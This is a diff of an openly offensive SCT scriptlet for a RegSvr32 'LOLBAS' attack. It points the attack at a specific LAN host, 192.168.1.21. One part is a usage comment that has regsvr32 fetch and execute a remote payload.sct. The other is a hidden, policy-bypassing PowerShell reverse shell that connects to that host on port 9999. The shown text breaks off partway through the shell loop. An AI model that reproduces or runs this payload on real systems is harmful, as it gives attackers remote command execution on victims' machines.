@@ -1,6 +1,6 @@
 <?XML version="1.0"?>
 <!-- SCT File for RegSvr32 LOLBAS Attack -->
-<!-- Usage: regsvr32.exe /s /n /u /i:http://0.0.0.0:8080/payload.sct scrobj.dll -->
+<!-- Usage: regsvr32.exe /s /n /u /i:http://192.168.1.21:8080/payload.sct scrobj.dll -->
 <scriptlet>
 
 <registration
@@ -16,7 +16,7 @@
 
 // PowerShell reverse shell payload
 var command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " +
-    "\"$client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',9999);" +
+    "\"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.21',9999);" +
     "$stream = $client.GetStream();" +
     "[byte[]]$bytes = 0..65535|%{0};" +
     "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" +
